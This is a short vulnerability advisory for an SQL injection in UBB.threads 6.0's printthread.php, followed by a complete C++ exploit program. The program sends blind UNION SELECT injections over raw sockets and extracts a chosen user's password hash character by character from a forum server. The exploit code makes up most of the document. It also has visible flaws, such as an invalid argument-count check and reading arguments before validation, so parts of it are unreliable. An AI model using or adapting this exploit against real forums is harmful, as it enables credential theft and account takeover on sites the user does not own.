source: http://www.securityfocus.com/bid/13253/info

It is reported that UBB.threads is prone to an SQL injection vulnerability.

The SQL injection vulnerability is reported to affect the 'printthread.php' script.

UBB.threads 6.0 is reported prone to this issue. It is likely that other versions are affected as well. 

//HLLUBBThreadsExploit.cpp
/*
  4. Exploitation

UBB Thread /ubbthreads/printthread.php SQL Injection Yes\No vulnerability

Usage: HLLUBBThreadsExploit.exe <hostname> <path to printthread.php> <Any vaild forum name> <user id>
Example: HLLUBBThreadsExploit.exe www.host.com /ubbthreads/printthread.php UBB3 2
Vulnerability discovered by: Axl
Exploit Coded by HLL: hllhll <at> gmail.com

*/
#include <winsock2.h>
#include <stdio.h>
#include <conio.h>
#include <iostream.h>
#pragma comment (lib,"ws2_32")

void usage(char *argv[])
{
        cout << "[+] UBB Threads Proof-Of-Concept Exploit, Written by: HLL" << endl;
        cout << "[+] Usage:" << endl;
        cout << "[+] " << argv[0] << " <hostname> <path to printthread.php> <Any vaild forum name> <user name> " << endl;
        cout << "[+] " << argv[0] << " www.host.com /ubbthreads/printthread.php UBB3 HLL" << endl;
}


int main(int argc, char *argv[]){


        WSADATA wsaData;
        struct sockaddr_in saddr;
        WSAStartup(MAKEWORD(1, 1), &wsaData);
        struct hostent *h;
        char hash[34]={0};
        int rcvlen;
        char ch;
        int flag, pos;
        int countwait;
        SOCKET sock;
        char req[400];
        char buf[600];
        char rcvbuf[10000];
        char rcvtmpbuf[1024];

        char *host=argv[1]; //Server
        char *path=argv[2]; // Path to /ubbthreads/printthread.php
        char *fname=argv[3]; //Forum name
        int uid=atoi(argv[4]); //User id

        if (argv!=5){
                usage(argv);
                return(0);
        }
        //Resolve address (will work also if this is an IP)
        cout << "[+] Resolving host... ";
        if (!(h=gethostbyname(host)))
        {
                cout << "FAILD!" << endl;
                return(1);
        }
        cout << "Done." << endl;

        saddr.sin_addr=*(struct in_addr *)h->h_addr_list[0];
        memset(saddr.sin_zero, 0, 8);
        saddr.sin_port=htons(80);
        saddr.sin_family=AF_INET;


        cout << "[+] Exploiting target... " << endl;
        for (pos=1; pos<=32; pos++)
        {
                for (ch='0'; ch<='F'; ch++)
                {
                        if ( (sock=socket(AF_INET, SOCK_STREAM, 0)) == -1 )
                        {
                                cout << "FAILD CREATING SOCKET!" << endl;
                                return(1);
                        }


                        if (ch==':') ch='A'; //If finished all digits, jump to hex digits

                        //Prepare reqest
                        sprintf(req,
"%s?Board=%s&type=post&main=-99'%%20UNION%%20SELECT%%20B_Number,B_Posted%%20FROM%%20w3t_Posts,w3t_Users%%20WHERE%%20((MID(U_Password,%d,1)='%c')", path, fname, pos, ch,
pos, ch+32);
                        if (ch>='A' && ch<='Z')
                                sprintf(req, "%sOR%%20(MID(U_Password,%d,1)='%c')", req, pos, ch+32);
                        sprintf(req, "%s)AND(u_number=%d)/*", req, uid);
                        sprintf(buf, "GET %s HTTP/1.0\r\nAccept: * /*\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)\r\nHost: %s \r\n\r\n", req,
host);

                        connect(sock, (struct sockaddr *)&saddr, sizeof(struct sockaddr) );
                        send(sock, buf, strlen(buf), 0);
                        cout << "[+] Char: " << ch << endl;

                        //Loop untill disconnection or recognized string
                        flag=0;
                        countwait=0;
                        *rcvbuf=NULL;
                        while(!flag){
                                Sleep(30);

                                if ((rcvlen = recv(sock, rcvtmpbuf, 1023, 0))>0){
                                        rcvtmpbuf[rcvlen]=NULL;
                                        strcat(rcvbuf, rcvtmpbuf);

                                }

                                if ( (++countwait) == 30)
                                        flag=2;
                                if ( strstr(rcvbuf, "SQL Error"))
                                        flag=1;
                        }
                        if (flag==1){ //Char found
                                cout << "[+] Char " << ch << " In pos " << pos << endl;
                                hash[pos-1]=ch;
                                ch='G';
                        }
                        closesocket(sock);
                }

        }


        hash[32]=NULL;
        cout << endl << "The hash for user id" << uid << "is: " << hash << endl;
        WSACleanup();
        return (0);
}